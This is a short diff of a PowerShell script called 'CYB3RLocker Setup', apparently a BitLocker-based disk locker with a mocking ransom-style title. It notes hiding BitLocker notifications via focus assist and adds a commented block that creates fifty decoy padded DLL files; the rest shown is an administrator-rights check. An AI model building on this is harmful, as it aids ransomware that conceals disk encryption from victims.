@@ -4,6 +4,11 @@
 Enable focus assist to block BitLocker notification to pop up.
 #>
 
+<# PREP:
+$InstallPath = 'C:\Users\admin\Desktop\CYB3RLocker'
+1..50 | ForEach-Object {$fakecontent = "A" * (Get-Random -Minimum 1kB -Maximum 5kB); $fakecontent | Out-File (Join-Path $InstallPath "Library$(Get-Random).dll")}
+#>
+
 $host.ui.RawUI.WindowTitle = 'CYB3RLocker Setup - secure your hardware and spend some money!'
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 If (!( $isAdmin )) {
